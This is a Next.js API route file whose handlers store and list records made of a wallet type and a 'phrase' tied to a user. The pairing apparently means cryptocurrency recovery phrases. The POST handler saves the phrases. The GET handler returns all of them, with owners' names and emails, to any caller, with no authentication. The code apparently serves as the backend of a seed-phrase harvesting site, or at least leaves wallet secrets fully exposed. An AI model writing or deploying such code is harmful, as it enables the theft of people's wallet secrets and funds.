import { db } from '@/lib/db';
import { NextRequest, NextResponse } from 'next/server';

export async function GET() {
	try {
		const phrases = await db.phrase.findMany({
			include: {
				user: {
					select: {
						id: true,
						name: true,
						email: true,
					},
				},
			},
			orderBy: {
				createdAt: 'desc',
			},
		});

		return NextResponse.json(phrases);
	} catch (error) {
		console.error('Error fetching phrases:', error);
		return NextResponse.json(
			{ error: 'Failed to fetch phrases' },
			{ status: 500 }
		);
	}
}

export async function POST(request: NextRequest) {
	try {
		const body = await request.json();
		const { walletType, phrase, userId } = body;

		if (!walletType || !phrase || !userId) {
			return NextResponse.json(
				{ error: 'Missing required fields' },
				{ status: 400 }
			);
		}

		const newPhrase = await db.phrase.create({
			data: {
				walletType,
				phrase,
				userId,
				createdAt: new Date(),
			},
			include: {
				user: {
					select: {
						id: true,
						name: true,
						email: true,
					},
				},
			},
		});

		return NextResponse.json(newPhrase, { status: 201 });
	} catch (error) {
		console.error('Error creating phrase:', error);
		return NextResponse.json(
			{ error: 'Failed to create phrase' },
			{ status: 500 }
		);
	}
}
